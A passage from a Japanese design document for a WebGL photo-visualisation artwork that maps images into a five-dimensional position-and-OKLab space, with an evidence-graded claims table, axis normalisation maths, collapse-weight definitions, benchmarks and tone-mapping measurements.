| **潰しの遷移が連続である** | **A** | `d ∈ (0,1)` を 0.001 刻み。線の全長がスプライト直径 8.65 px を越える過程で滑らかに移る（141 → 142 → 136 → 129 → 122）。0.02 刻みで掃くと 19 コードの段差に見えるが**段差ではない**（§7.7）|
| `n ≤ 3` の領域で **+2 コード**の膨らみ | **A（予算なし）** | 141 → **143** → 136。点が 2〜3 個だと `axisCoverage` のセル平均と実際の位相がずれる。**事実として固定するだけで予算は置かない** |
| **`gainFor` が全域で有限** | **A**（前は `Infinity` を返しえた） | `ksumLookup` の下端分岐が `ksum = 0` を返す領域があった。`MIN_CALIBRATED_S0 = 0.86` でクランプ（§4.18） |
| `dimLevel = 0` の欠損の**大きさ** | **A**（1b の −6.73% は**誤り**） | 1c 時点で中心の峰 sRGB **129**（平均色 141 に対しリニア比 **−17.58%**）。§7.7 |
| **欠損の機構 —— 因子 1: サブピクセル位相 −13.08%** | **C → A**（Phase 2a） | 図の中心は NDC 原点 → ウィンドウ座標 `(W/2, H/2)`。**DPR 2 の drawingBuffer は常に偶数×偶数なので画素の角**で、最近傍フラグメントは各軸 0.5 px。減衰は `exp(−F·2·(0.5/S)²)` = **0.8691864**。峰が**単一画素ではなく 2×2 の平坦部**として実測される（§7.7）|
| **欠損の機構 —— 因子 2: 不等な加算項の half-float 累積 −5.2%** | **A（存在と依存性）／C（大きさのモデル）** | **一様グレーでは深度 378 でも残差 ≈ 0**、標本 No.0 で −5.2%、二値画像で −6.0%、**同じ画素集合の鏡像で −4.5%**（順序で 1 コード動く）。暗い列の 1 点あたりの寄与 3.0e−5 は fp16 最小正規数 6.104e−5 を下回る。**大きさを予測するモデルはまだ無い**（§7.7）|
| 1c の「径を逆算すると 7.28/8.45/8.49 とばらつく」 | **偽**（2a で解消） | 中心を**画素中心と仮定した**当てはめの産物。角に落ちているとき片側へ歩けば 6.08/7.07/7.48、逆へ歩けば 10.60/12.24 が出る。プロファイル全体（21/57/99）と `discard` 境界は S = 8.654 / F = 21 / 中心 (494.0, 389.0) で予測どおり |
| **なぜ 1b が 1.5244 を記録したか** | **C（据え置き。筋はあるが弱い）** | 位相の偶奇表は「片方だけ奇数」で −6.770% / sRGB **137** / ΔE00 **1.5468** を出し、1b の −6.73% / 137 / 1.5244 と 3 つとも合う。**しかし 1b が測ったペイン既定は 1778×1718 で両方偶数**であり、それなら 133 が出るはず ── 一致は偶然でありうる。**追わない。**残すのは規則のほうで、潰した図の数値には drawingBuffer の偶奇を併記する |
| 軸ごと正規化は (3,4) を色相回転でなくする | **B** | `D⁻¹RD ∉ SO(2)`（s_a≠s_b）は代数的に確定。→ ブロック等方正規化 |
| clear color 漏れの機序 | **B** | 親に実測（`#05060f` が `rgb(22,27,58)` として届く）。LENS では未測定 |
| postfx 定数（bloom 閾値ほか）の再測定が必要 | **C（自覚あり）** | Phase 2 |
| **「画像は端末から出ません」** | **B**（上限） | 静的検査(§6.2) + violation 実測(§6.3) で B に到達。真の A は原理的に不可能 —— 「出ない」は無限の反証 |
| iOS 実機で 40MP 写真が生存する | **C（据え置き）** | 実機でしか測れない。**デスクトップの行（上）と混ぜない** ── 混ぜた瞬間に C を A に見せる飾りになる |
| **空状態が実入力で正しく分類される** | **A** | 到達可能な 4 コードを実測（空 / ゴミ・テキスト・SVG / HEIC・偽装 HEIC・type 無し / 90MP）。§7.8 |
| **文言が 1 か所にしかない** | **A** | `satisfies Record<IngestFailureCode, EmptyState>` が tsc に全射を見せ、`copyGuard.test.ts` が TypeScript の scanner で `src/ingest/` `src/ui/` の日本語文字列リテラル 0 を見張る。**初回実行で 5 件の漏れを捕まえた** |
| **退化の表明がシーンへ届く** | **A**（1b では未実装） | 退化軸の `extent` を 0 に固定し、`axisPresent` / `extent` を `sceneStats` に出す。グレースケールで `[1,1,1,0,0]`、単色で `[1,1,0,0,0]`（§2.2）|
| **アンカーが機体に依らない** | **偽**（Phase 2a・#18 の CI 初回実行） | `bootTier()` が `hardwareConcurrency`/`deviceMemory`/DPR を読むので**ティアが機体で変わる**。runner（4 コア）は **BALANCED** で起動し格子 251×157・`s0` 3.3851792828685254。「ラスタライザに依らない」は真だが、**機体に依らないとは言っていなかった** ── 1 機体でしか測っていなかった |
| **どのティアでも CI がアンカーを採点する** | **A**（Phase 2c-iii） | ラダーの表をティア別に割った。BALANCED の 5 値は node の計算と **CI の実出力が `Object.is` で一致**（`s0` 3.3851792828685254 / `gain` 0.45296699544158425 / `cascadeDist` 3.3746125074981395 / 格子 251×157）。`cameraDistance` / `fillX` / `meanHex` は 3 ティアで同一。**ULTRA だけ未観測**（node の予測）|
| ~~ティアを固定する口が無いと CI で 6 行が採点できない~~ | **偽**（Phase 2c-iii） | 必要だったのは口ではなく**ティアごとの期待値**だった。`anchors.test.ts` は 1c から全ティアを計算できたのに、`TIER_BUDGET.HIGH` を差し替えてみた者がいなかった ── §0.1 規律 8 の再発 |
| **ティアの `dpr` / `samples` が配線されている** | **偽**（Phase 2c-iii で判明・未修正） | `Engine.setQuality()` の**呼び出し元がゼロ**。`dprCap` は `BOOT_DPR_CAP = 2` のまま固定で、`main.ts` が `tier` から使うのは `tier.budget`（格子）だけ。2b の `CompressPass` 未配線と**同じ型**。CI の runner が BALANCED（`dpr: 1.5`）でも drawingBuffer 988×778 だったのはこれが理由。**配線すると BALANCED で 741×584 になり §7.7 のアンカーが全滅する**ので、昇格は別 PR（`engineConfig.test.ts` が忘却を防ぐ記録を持つ）|
| ~~`sampleWeight` の厳密 1 が構造で守られる~~ | **偽 → A**（Phase 2a で直した） | 基準に無限格子を渡していたので分子と分母の `n` が違い、**HIGH で厳密 1 だったのは数値の偶然**だった（BALANCED で **0.9999999999999996**）。`refNx`/`refNy` を渡す形にして、3 ティア × 4 縦横比で `Object.is` を確認（§2.3）|
| **CI がブラウザ測定の構造回帰を見る** | **A**（Phase 2a・#18） | `npm run ladder -- --structural`。**ΔE00 は置かない** ── GPU の無い runner が測るのは SwiftShader で、予算次第で「ソフトウェアは緑・出荷経路は赤」が作れる。実測 **18 行 / 通過 18 / 失敗 0 / 採点しない 0**（Phase 2c-iii。それまでは 17 行・通過 11・**採点しない 6**）（§7.9）|
| **歯が抜けていないことを CI が見張る** | **A**（1b までは手作業） | `npm run teeth` が台帳の **57 変異**を入れて本当に落ちるかを確かめる。実測 **57/57**（12 分 24 秒。§7.9。2c-viii は 54、2c-vii は 53、2c-vi は 49、2c-iv は 48、2c-iii は 47、2c-i は 44、2b は 43、2a は 30、1c は 22）|
| ~~`teeth` のラチェットは後退を止める~~ | **偽 → A**（Phase 2c-ix で実演） | 2c-viii が置いた 3 つの機構に**severe な穴が 2 つ**在った。**(1)** 全 54 本の `observed` を **0 に一括置換**すると、完全性検査が `typeof === 'number'` しか見ないので通り、`failed < 0` が常に false になって**弱りの検出が丸ごと無効**になる。**(2)** 変異を 1 本消して別の 1 本を足せば**本数は 54 のまま**で、複製検査は `find` を部分文字列にすれば回避できる（消えるのは 2c-vi が実バグを捕まえた `linePoints` の歯）。どちらも `tsc` ＋ `npm test` ＋ `teeth` の全門を **EXIT=0** で抜けた。→ 総和のラチェット（**143**）と**歯の名簿**（`EXPECTED_IDS` 57 本）と**変異後の中身での複製検査**に替えた。さらに監査が「総和を保ったまま片方を下げる」を実演したので、**全 57 本の `observed` を全走行の実測へ締めた**（9 本を上げ、総和 133 → 143。無償の余白 3 点が消えた）（§7.9） |
| **doc の数が「関数と引数」で再現する** | **A**（Phase 2c-ix） | `docLedger.test.ts` が実装 doc の表を機械で数え（**36 表** / `src/tests/` **13 表** / 合計 **49**・定義 5 通りで 5/5 一致）、**7 表 87 セル**を doc のテキストから読んだ期待値と照合する。**期待値を台帳に書かない**のが要点（書くと doc を 999 に全置換しても緑）。初回に**書かれていない前提を 4 件**（`2⁻²⁰` / `srgbToLinear(128/255)` / `K_SPRITE·s0` / `viewportAspect`）と **doc 側の誤りを 3 セル**捕まえた（§7.10） |
| ~~「GPU / ブラウザ依存の約 14 表」~~ | **導出が無い数**（Phase 2c-ix） | 監査が数え方を **13 通り**実装して総当たりし、13〜15 に入るのは **1 通りだけ**（他は 0/3/3/8/8/8/8/10/11/16/17/8）。2c-viii の「49 件 / 44 行」（210 通り中 0 通り）と**同じ形** ── 数を先に決めて機械を後から作った。除外表（44 件・理由つき）に替えた |
| ~~代償表の ×1.354 は `layout()` の有無で変わる~~ | **偽**（Phase 2c-ix で実測） | **`layout()` は 1 ビットも効かない。** `layout(778×778)`（`a = 1`）は `layout()` 無しと 1F 目も 300 秒後も `Object.is` で一致する（2.926651 / 3.961528 / ×1.353605）。効いているのは **`viewportAspect` だけ**で、`layout()` は既定 1 以外を入れる唯一の口なので相関しただけだった。2c-viii が**監査の要約を検算せずに書いた**（§7.10）|
| ~~収束表は `viewportAspect ≥ 1.27` で再現する~~ | **数が違う**（Phase 2c-ix） | 向き（既定 1 では再現しない）は真。閾値は `aX/aY` で決まり、M=256 で **1.0760**・M=4096 で 1.0045、二分探索の最小値は **1.07594**。**1.27 は 988/778 という 1 環境の値**であって閾値ではなかった（§7.10）|
| ~~`TIER_BUDGET` と描画点数が三者三様~~ | **偽（ただし別の不一致が在る）**（Phase 2c-ix） | `TIER_BUDGET.ULTRA` / `kernel.bench.ts` / §4.3 は **3/3 とも 489×326 = 159,414**。食い違うのは**予算と `fitGrid` が実際に描く点数**で、1024×640 では ULTRA **505×315 = 159,075** / HIGH **378×236 = 89,208**。幅を 3,901 通り掃くと予算ぴったりは **12 通りだけ**。§4.3 の「1.29 ms」は**出荷経路が一度も描かない格子**についての主張である |
| ~~加算深度は全 dimLevel で `n ≤ 512`~~ | **偽**（Phase 2c-v で実測） | **緑だったのは掃引が `d += 0.25` の 21 点だったから**。深度は閉形式で最大は **`4 × rows`**（HIGH **944** / BALANCED 628 / ULTRA 1260）── **3 ティアとも 512 超**。帯は `d ∈ (1, 1.0301]`。折れ点を 703 点列挙して捕まえた。**未修正のまま値を固定して記録**（§4.6.1）。~~0.01 刻みでも踏み損ねる~~ は **Phase 2c-vii で偽と判明**（下記）|
| **`modelledAdditionDepth` はモデルであって測定ではない** | **A**（2c-v で名前ごと直した） | doc の「実測 16 / 4 / 378」は**関数自身の出力**だった（§0.1 規律 4）。378 は Phase 2a 以降 到達不能。GPU に数えさせた実測との比は `d → 1⁺` で **1.00（厳密一致）**、`d = 2` で 1.19（過大）、**`d ≥ 2.25` で 0.35〜0.43（過小）** ── **誤差の向きは `dimLevel` で変わる**（§4.6.1）|
| **G12 の予算に歯が在る** | **A**（2b〜2c-iv は**無かった**） | 既存の故障 `colorfield` は `dev ≈ −100%` を出すので予算の値を 1 つも検証していなかった ── **0% から 100% までどこへ動かしても全テストが緑**。`teeth.mjs` の台帳は `src/` しか書き換えないので構造的に作れない。ラダーへ `g12budget`（0.3% だけ壊す）を足し、**0.5% へ戻すと素通りすることを実測で確かめた**（§4.6.1）|
| ~~ブラウザ測定には自動ゲートが無い~~ | **偽**（Phase 2a） | `npm run ladder` がシステム Chrome を headless で駆動し、**実 GPU（ANGLE Metal）**で **72 行**を採点する（2c-iii は 71、2c-ii は 70、2b は 68、2a は 50）。G9 が 2 フェーズ腐ったのは、この空白が「限界」として書かれていたためである（§7.9）|
| **ラダー自身にも歯がある** | **A** | `npm run ladder:teeth` が `__LENS__` 越しに **14 種**の故障を注入し、期待した行が実際に落ちることを確かめる。**14/14**（2c-iii は 13、2c-ii は 12、2b は 11、2a は 7）。初版は G9 の判定に `true` をベタ書きしていた（§7.9）|
| ~~ラダーの歯は 14/14 で安定している~~ | **走行依存の歯が 1 本ある**（Phase 2c-ix で実測） | 同じ `src` で 2 回回して **1 回目 13/14・2 回目 14/14**。抜けたのは `grade`（期待 G0 → 実際は G6/G8b が落ちた）。`grade` は 1 画素あたり ±0.0075 の**零平均**の摂動なので、`G0` が拾うかどうかは標本点の運である ── **「予算が厳密 0 の行だけが捕まえる」と書いた当の理由が、そのまま不安定さの理由**になっている。**2 回に 1 回抜ける歯は「在る」と書けない。** 故障側を零平均でない摂動にするか、`G0` の標本点を増やすかは 2c-x 以降 |
| **1.0 を超えた値を観測できる** | **A**（2a より前は口が無かった） | `HdrCapture` が `OutputPass` の**前**でリニアのまま写しを取り、`readbackHDR()` が `Uint16Array` で読む。自己検査は **2.5 / 0.25 / 0.0625** を厳密に往復。公開ページで `data-lens-capture-hdr="ok"` |
| **すべての数値にラスタライザの素性が付く** | **A** | `glInfo()` の `UNMASKED_RENDERER`。監査が同じページ・同じアンカー・同じ痕跡で峰を **133**（SwiftShader）と **129**（ANGLE Metal）の 2 通り測ったため（§7.9）|
| 1a-iii / 1b が手で測った **G2a / G4 / G2b の個別値** | **再現できない記録** | 2a のラダーは雲 G2a **0.2059** / G4 **0.3450** / G2b **−0.913%** を出すが、1a-iii（0.3806 / 0.4217 / −1.682%）とも 1b（0.3757 / −1.422%）とも一致しない。**回帰ではなく推定器が違う** ── 手測定の窓はどこにも記録されておらず再現手段が無い。予算判定は 3 フェーズとも通っている。以後はラダーのコードが推定器の定義そのものである |
| GPU 頂点シェーダ経路が不要 | **B** | 根拠となる測定（CPU 1.29ms/frame）は A だが、「不要」は測定ではなく**判断**。覆る条件は §4.4 に明記 |

---

## 1. 優先順位

衝突したときは上から順に優先する（親 §1 を継ぐ）。

1. **数学的な正しさ** —— 投影・回転・色空間変換に近似も「芸術的な嘘」も入れない
2. **図の可読性** —— UI が作品を隠さない
3. **芸術性**

「軸ごと正規化」を捨てたのは 1 のためである。あれは見た目には動き、
「軸スケールは規約なので開示すれば誠実」と言えば通ってしまう。しかし
**「(3,4) の回転は色相回転である」という主張そのものが偽になる**ので、開示では救えない。

---

## 2. 中核概念

写真は写像 `I: [0,1]² → 色空間` であり、そのグラフ

```
Γ = { (u, v, L(u,v), a(u,v), b(u,v)) }  ⊂  R² × OKLab = R⁵
```

は **R⁵ の中の2次元曲面**。画像処理で標準的な joint spatial-range space の定式化で、何も足していない。
天井の 5 は「色が 3 次元だから 2+3=5」という事実であって、任意に選んだ数ではない
（α チャンネルを持つ画像なら 6 —— 天井が*添付されたファイルの性質*になる。Phase 6）。

`dimLevel ∈ [0,5]`、`extent[k] = clamp01(dimLevel − k)`:

| n | EN | 状態 |
|---|---|---|
| 0 | MEAN | `[0,0,0,0,0]` 平均色の一点 |
| 1 | LINE | `[1,0,0,0,0]` 列平均の一本の線 |
| 2 | **PHOTOGRAPH** | `[1,1,0,0,0]` **あなたの写真そのもの —— 信頼の錨** |
| 3 | RELIEF | `[1,1,1,0,0]` 明暗が起伏になる |
| 4 | CHROMA | `[1,1,1,1,0]` 赤⇄緑が四軸目へ |
| 5 | GRAPH | `[1,1,1,1,1]` 完全なグラフ |

### 2.1 軸スケール —— ブロック等方正規化

**軸ごとに独立な正規化をしてはならない。** 3ブロックに分け、各ブロック内では等方に:

| ブロック | 軸 | スケール |
|---|---|---|
| 空間 | u, v | 1スカラー。アスペクト比を保存 |
| 明度 | L | 独立スカラー（この画像の L 分布幅、下限あり） |
| 彩度 | a, b | **1スカラー**。95パーセンタイルの彩度半径 `√(a²+b²)` |

正規化を `D = diag(1/s_u, 1/s_v, 1/s_L, 1/s_a, 1/s_b)` と書くと、正規化座標での回転 `R(θ)` は
OKLab 座標では共役 `D⁻¹R(θ)D` として作用する。`s_a ≠ s_b` のときこれは円ではなく楕円
`(a/s_a)² + (b/s_b)² = c` を保つので **SO(2) の元ではない** ——
彩度が保存されず、色相が一様に進まない。ブロック等方なら `D` の (3,4) ブロックは `s_c·I` で、
`D⁻¹RD = R` が厳密に成り立つ。

| 平面 | 起きること |
|---|---|
| (0,1) | 普通の画像の回転（剛体） |
| (0,2), (1,2) | 明暗の起伏が形になって立ち上がる |
| (3,4) | **色相回転そのもの**（彩度不変・色相角が θ だけ進む） |
| (0,4), (1,3) | 位置が色に変わる、名前のない混合 |

### 2.2 退化入力の契約

ブロックのスケールが 0 になりうる（グレースケール画像で彩度ブロック、単色画像で明度ブロック）。
`0/0 = NaN` を避けるため、**幅が閾値未満のブロックは「その軸は存在しない」と表明する** ——
extent を 0 に固定し、読み出しに「この画像には色軸がありません（グレースケール）」と出し、
回転プリセットの「色相」「交換」を無効化して理由を示す。

これは回避策ではなく、この作品にとって最も正直な表明である。

**退化判定をヒストグラムから取ってはならない（Phase 1a-i で実測）。** 彩度は
`r² = a²+b²` の 1024 bin ヒストグラムで p95 を求めるが、bin 幅は `0.16/1024 = 1.5625e-4` なので
**bin 0 が `r ∈ [0, 0.0125]` を覆う**。しきい値 `C_MIN_P95 = 0.002` はその **1/39** で、
bin の中に埋もれている。純グレースケール（全標本 `r²=0`）でも bin 内線形補間の p95 は
**0.01218** ── しきい値の 6.1 倍になり、**退化が絶対に発火しない**。

→ 同じパスで `r² ≤ C_MIN²` の**厳密な個数**を数え、95% を超えたら退化と宣言する
（「p95 < C_MIN」と同値、比較 1 回）。ヒストグラムは非退化時の `sC` の値にだけ使う。

### 2.3 `sampleWeight` —— 潰しの補正（Phase 1b で定義した）

**この語は Phase 1a まで、この文書のフェーズ表に 1 度出てくるだけで定義が無かった。**
`dev/hook.ts` は「`sampleWeight` の現在値」とだけ書き、`main.ts` はリテラルの 1 を返していた。
定義の無い量を実装すると、テストは実装を写すだけになる ── だから先に定義を置く。

> **`sampleWeight` は、潰しのどの段階でも「図の中心のフラグメントが、
> その段階で意図した*縮約値そのもの*を読む」ようにする 1 点あたりの係数である。**
>
> ```
> 読める値 = 元の値 · gain · sampleWeight · Σw   を  元の値  に等しくしたい
> ⟹ sampleWeight = A(基準構成) / A(現在の構成)
> ```
>
> `A` は格子の被覆和（`spriteGain.ts` の `axisCoverage`）で、基準構成は
> `gainFor` が較正された「潰していない 2 次元格子」である。

#### なぜ「エネルギー保存」を採らないか

対立候補は「図全体の総光量を dimLevel に対して不変にする」だが、**採らない**。
線は面積 0 なので中心輝度が発散し、**ΔE00 で測れる量にならない**。
§7.2 の「予算の無い測定は A を生産できない」に照らすと、
予算を持てない定義は定義として失格である。

#### 「図の中心のフラグメント」は、存在しないことがある（Phase 2a で判明）

上の定義文は **`dimLevel = 0` では前提が成り立たない。** 図の中心は NDC 原点、すなわち
ウィンドウ座標 `(W/2, H/2)` にあり、**DPR 2 の drawingBuffer は常に偶数×偶数**なので、
そこは画素の**角**である。フラグメント中心は半整数にしかないので、
**中心にフラグメントは 1 つも無い** ── 最も近い 4 つが各軸ちょうど 0.5 px 離れ、
`exp(−F·2·(0.5/S)²)` = **0.8691864** 倍に減衰した値を返す（実測: 峰は単一画素ではなく
**2×2 の平坦部**）。1c が記録した **−17.58% の大半（−13.08%）はこれ**だった。

**これは重みでは直せない。** `sampleWeight` は `A(基準)/A(現在)` であって
`w(r_frag)` の項を持たず、持たせても「どのフラグメントで読むか」は測る側が決める。
直せるのは**定義か、図の置き方**だけである。§7.7 の G9 は
**位相を明示して再構成する**ことにし、そのモデルが要らない構成（drawingBuffer が奇数×奇数）で
別に確かめる（G9z）。

**そして潰れた軸は、CPU 側で先に畳む。** 378 点を同じ場所へ重ねて平均を作る必要は
どこにも無く（§2 の n=0 は「平均色の**一点**」である）、重ねると不等な項の
half-float 累積が入る（§4.6 の追記）。`effectiveLineCount(extentX, lineCount)` が
`n = extentX · lineCount` を返し、`extentX = 1` では上限へ厳密に戻るので
**`dimLevel = 1` の絵は 1 ビットも動かない**。

#### アンカーが構造で守られる —— **ただし 1c まで、それは偽だった**（Phase 2a で直した）

`extent = 1` のとき分子と分母は**同じ引数で同じ関数**を呼ぶので、戻り値は
`x/x` すなわち **1 に厳密に等しい**。`dimLevel = 2` の絵は 1 ビットも動かない
（`collapse.test.ts` が `Object.is` で見ている）。

**この段落は長らく成立していなかった。** 基準に「無限に伸びた格子」
（`AXIS_UNBOUNDED = 1 << 24`）を渡していたので、`extent = 1` でも分子と分母は
**`n` の違う呼び出し**だった。`axisCoverage` は内部で `half = (n − 1)/2` と
`x = t − (i − half)·delta` を通るので、`n` が違えば同じ値を足していても丸めが変わる。

**CI が ubuntu の runner で BALANCED ティアに落ちて、初めて出た**:

| ティア | 格子 | `A(unbounded)` | `A(n)` | `sampleWeight` |
|---|---|---|---|---|
| HIGH | 378×236 | 1.487465316005411 | 1.487465316005411 | **1**（厳密）|
| BALANCED | 251×157 | 1.4874653160054105 | 1.4874653160054**108** | **0.9999999999999996** |

**HIGH で厳密 1 だったのは数値の偶然**であって、構造ではなかった。
そして `collapse.test.ts` の `Object.is(…, 1)` が緑だったのは、
**測っている機体のティアが HIGH だったからにすぎない** ── 機体依存のテストである。

→ `CollapseConfig` に基準の点数 `refNx` / `refNy` を持たせ、格子経路は自分の点数を渡す。
`1 * s0x === s0x` は厳密なので分子と分母が**文字どおり同じ引数**になり、
`x/x` が**どのティアでも** 1 になる。無限格子との差は最終 ulp だけである
（スプライトは ±2 セルしか届かない）。ラダーの G 値は 1 つも動かなかった。

**歯も 1 度抜けた。** 「基準を無限格子へ戻す」変異を台帳に足したが緑のままだった ──
追加したテストが `s0y = s0 × 1.001` だけを見ており、**その比では BALANCED でも
たまたま厳密 1 になる**。つまり**直したはずの偶然の上でテストしていた**。
セルの縦横比を 4 通り振って噛むようにした。

#### 実測（`s0 = 2.2478 px` / `S = 8.6548 px` / 格子 378×236）

| 構成 | `sampleWeight` | 意味 |
|---|---|---|
| 格子 `d = 2` | **1**（厳密） | アンカー |
| 列平均線 `d = 1` | **1.48591** | 失われた y 方向の被覆を戻す |
| 列平均線 `d = 0.5` | 0.74296 | 線が縮んで密度が上がるぶん |
| 列平均線 `d = 0` | **0.0058472** | 全列の和 → 全体平均 |

**`sampleWeight` そのものは連続でなくてよい。** これは物理を打ち消すために動く量で、
実際 `d = 1.00` と `d = 1.01` の間で **1.91 倍**動く（最後の縦の広がりが消えると、
ガウシアンで減衰していた点が全重量になるため）。**連続であるべきは「読める値」のほう**で、
ここを取り違えると補正を殺したうえで「滑らかだから正しい」と読めてしまう
（Phase 1b で実際に 1 本そう書いて、書き直した）。

---

## 3. モード

| | 範囲 | フェーズ |
|---|---|---|
| **A 色を軸にする** | n ≤ 5 | Phase 1〜3 |
| **B 押し出す**（画像 2-cell × 超立方体） | n ≤ 10 | Phase 4 |
| **C 観測者の次元** | m ∈ {1..4} | Phase 5 |

モード B は `2^(n−2)` 枚の複製になるので、**Phase 1 の時点で `colorPointBatch` を
`InstancedBufferGeometry`（`instanceCount = 1`）で書く**。Phase 1 のコストはゼロ（同じ1ドローコール）。

**この「コストはゼロ」には条件があり、初版は書いていなかった（Phase 1a-iii で実測）。**
`instanceCount` を**明示的に 1 にしたときだけ**、素の `BufferGeometry` と画素まで同一になる。
既定値（`Infinity`）のままだと**1 画素も描かれず、GL エラーも出ない** —— §4.15 を必ず読むこと。

### 3.1 訂正 —— 「Phase 4 は足すだけ」は偽（実測）

初版の本節は「Phase 4 は `instanceCount` と per-instance オフセット属性を足すだけ」と書いていた。
**偽である。**

モード B の複製は **Rⁿ の平行移動**であり、透視カスケードは次元ごとに除算する**非線形**写像なので
`project(M(x+o)) ≠ project(Mx) + c`。実測（dist=3.0、軸 3,4 に 0.5 のオフセット）:

| | 投影後の差 |
|---|---|
| 点 A | (0.13825, −0.09217, 0.18433) |
| 点 B | (−0.04430, 0.19934, −0.08859) |

差が点ごとに **0.2915** も違う ── 投影後の 3D 平行移動では再現できない。
`InstancedBufferAttribute` としてオフセットを持たせても、それが効くのは投影の**後**なので、
別の絵になる。

**正しい理解:** オフセットは Rⁿ で、カスケードの**前**に加えなければならない ──
つまり本作が意図的に CPU に置いた変換の側（§4.1）である。
`InstancedBufferGeometry` にしておくこと自体は無害でコストもゼロなので続けるが、
**Phase 4 の実装者が「`instanceCount` を上げるだけ」と読んではいけない。**
実際に必要なのは position バッファの拡幅であって、instancing ではない可能性が高い。
水準は **C** ── Rⁿ→R³ 変換を頂点シェーダへ移す場合にのみ、instancing が本来の意味を持つ。

---

## 4. ホットパスと取り込み

（節番号は動かさない ── §4.7 以降を他所から参照しているので、取り込みの節は
**挿入ではなく追加**（§4.12〜§4.14）にしてある。見出しのほうを内容に合わせた。）

### 4.1 なぜ `rotateBatch` を毎フレーム呼ばないか

`rotateBatch` は回転平面ごとにバッファ全体をストリーミングする。平面回転の列は先に 1 枚の
n×n 行列へ合成でき（`composeRotN`）、合成は 1 フレームに 1 回・25乗算×平面数で済む。

さらに `extent` の対角 `E` は回転の**前**に掛かるので `M = R·E` として**列をスケールするだけ**で
畳める（`foldExtent`）。投影も同じループに入れる。結果、5要素をレジスタに読んで 3要素だけ書く。

### 4.2 f32 で足りる理由

`rotation.ts` の契約どおり角度は毎フレーム絶対値で再計算するので誤差が蓄積しない。
座標は [−1,1] に住み、元データは 8bit の画素値。f64 の stride 40 バイトは全点が
64B キャッシュラインを跨ぐという実害もある。

正しさの根拠は一点: **`projection.ts` の素直な実装と 1e-6 で一致すること**（`rotationN.test.ts`）。

### 4.3 実測（水準 A）

Apple M1 Max / MacBookPro18,4 / Node 24.13.0 / vitest bench。`mean` がそのまま ms/frame。

| tier | 格子 | 点数 | 融合(n=5展開) | 融合(一般n) | 素直な3パス |
|---|---|---|---|---|---|
| BALANCED | 244×162 | 39,528 | **0.62 ms** | 2.02 ms | 1.36 ms |
| HIGH | 366×244 | 89,304 | **0.79 ms** | 4.57 ms | 3.11 ms |
| ULTRA | 489×326 | 159,414 | **1.29 ms** | 7.57 ms | 5.90 ms |

**≈ 8.1 ns/点/フレーム**（ULTRA）。16.7 ms のフレーム予算の 7.7%。

**測定が計画の想定を 2 か所で覆した:**

1. **8.1 ns/点は、監査が「楽観的すぎる」と評した 15〜20 ns よりさらに 2 倍速い。**
   唯一の先行実測だった親の 65 ns/点（n=10・26,600点）からの外挿は悲観側に外れていた。
2. **一般版は素直な3パスより*遅い*（7.57 ms vs 5.90 ms）。** 融合そのものが効いているのではない ——
   効いているのは**中間配列を捨ててレジスタに載せたこと**である。一般版は n² の行列積を
   モジュールレベルの `Float64Array` スクラッチ越しに回すので、rotateBatch の
   「平面あたり 4 乗算・単純ストライド」に負ける。展開版だけが勝つ。

   したがって `liftProject5` は残す（消す判断だったが、測定が覆した）。
   `liftProject`（一般 n）は**参照実装およびモード B 用**として残し、実行経路にはしない。

### 4.4 GPU 頂点シェーダ経路を採らない —— 理由の訂正

計画初版は罠#11（`onBeforeCompile` のアンカー破損）を理由にしていたが、**ここではシェーダを
最初から自分で書く**ので `onBeforeCompile` は登場せず、罠#11 は存在しない。棄却の正しい理由は
「CPU 版がテストの参照実装になること」と「単純さ」、そして **Phase 0 の実測で CPU が
フレーム予算の 8% しか使わないと分かったこと**である。

判断が覆る条件を明記する:
- 中位機で HIGH が 60fps を割る（M1 Max の 3 倍遅い機体なら ULTRA で 3.9 ms —— まだ余裕がある）
- 250k 点超が必要になる（アンカー窓の解像度問題を点数で解こうとした場合）

GPU 経路にすれば 1.9 MB/frame のアップロードが 0 になる。数字は正確に持っておく。

### 4.5 `NeutralToneMapping` を使わない —— 実測（水準 A）

計画初版には「Neutral は ~0.8 以下でほぼ恒等・色相保存」と書いてあった。**偽である。**
r185 の実装（`ShaderChunk/tonemapping_pars_fragment.glsl.js`）はこう書かれている:

```glsl
const float StartCompression = 0.8 - 0.04;   // = 0.76
float x = min( color.r, min( color.g, color.b ) );
float offset = x < 0.08 ? x - 6.25 * x * x : 0.04;
color -= offset;                              // ← 早期 return の "前"、無条件
float peak = max( color.r, max( color.g, color.b ) );
if ( peak < StartCompression ) return color;
```

ブラックポイントの減算が早期 return の**前**にあるので、低輝度側でも必ず 0.04 が引かれる。
自分で数値を通した結果:

| 入力 sRGB | リニア | Neutral 後の sRGB | 差 |
|---|---|---|---|
| 128（中間調） | 0.2159 | **116** | −12 |
| 63（暗部） | 0.0497 | **33** | −30 |
| 200 | 0.5776 | **194** | −6 |

暗部はほぼ半分に潰れる。`dimLevel=2` は本作が乗っている唯一の錨で、忠実性テストは
読み戻して元 RGB と比較する設計なので、**正しく実装しても必ず落ちる**。
→ `renderer.toneMapping = NoToneMapping` 固定。加算が 1.0 を超える高 dimLevel 用の圧縮は
`CompressPass`（OutputPass の前、リニア空間、`uStrength` を dimLevel で駆動）が担う。

~~**この最後の 1 句は Phase 1b 時点でまだ実装されていない（水準 C）。**~~
→ **Phase 2b で配線した。** 2a まで `setCompressStrength` の呼び出し元は 1 つも無く、
出荷経路ではパス自体が `enabled = false` だった ──
**「1.0 を超えた加算を圧縮する」は 3 フェーズにわたって書いてあるだけだった。**

#### 実測した分布（`readbackHDR`・988×778・ANGLE Metal / Apple M1 Max・標本 No.0）

`OutputPass` の**前**で全面を読み、`dimLevel` と位相を掃いた:

| dimLevel | p50 | p99 | p99.9 | 最大 | > 1.0 の画素 |
|---|---|---|---|---|---|
| 0 | 0.135 | 0.237 | 0.237 | **0.237** | 0 |
| 1 | 0.188 | 0.376 | 0.422 | **0.437** | 0 |
| 1.5 | 0.218 | 0.970 | 1.026 | **1.050** | 2,192 |
| **2（アンカー）** | 0.216 | 1.000 | 1.000 | **1.000** | **0** |
| 2.5 | 0.220 | 0.996 | 1.225 | **1.740** | 9,842 |
| 3 | 0.221 | 0.998 | 1.168 | **1.540** | 8,090 |
| 4 | 0.220 | 1.001 | 1.203 | **1.638** | 5,615 |
| 5 | 0.219 | 1.042 | 1.366 | **1.718** | 10,391 |

位相まで掃いた**包絡**は **2.0176**（`d = 4.25`）。
**「1b の潰しは 1.0 を超えない」は正しかったが、`d > 2` では実際に超えていた** ──
`d = 5` では 1 万画素が切り落とされていた。

> **⚠ この「包絡」は包絡ではなかった（Phase 2c-i で実測）。**
> 上の掃引は `freezeRotation(true)` + `resetRotation()`、つまり**位相 0 の近傍**でしか
